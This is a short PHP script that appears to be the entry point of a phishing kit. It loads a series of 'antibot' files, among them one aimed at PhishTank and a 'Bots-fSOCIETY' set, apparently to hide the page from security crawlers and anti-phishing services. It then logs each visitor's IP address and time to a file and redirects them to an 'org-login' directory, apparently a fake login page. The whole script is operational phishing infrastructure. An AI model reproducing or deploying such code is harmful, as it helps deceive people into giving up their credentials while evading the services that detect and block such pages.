<?php
include "antibots/#1.php";
include "antibots/#2.php";
include "antibots/#3.php";
include "antibots/#4.php";
include "antibots/#5.php";
include "antibots/#6.php";
include "antibots/#7.php";
include "antibots/#8.php";
include "antibots/#9.php";
include "antibots/#10.php";
include "antibots/#11.php";
include "antibots/#12.php";
include "antibots/antibot_host.php";
include "antibots/antibot_ip.php";
include "antibots/antibot_phishtank.php";
include "antibots/antibot_userAgent.php";
include("./org-login/system/blocker.php");
include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php");

$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="org-login";
header("location:$src");
?>
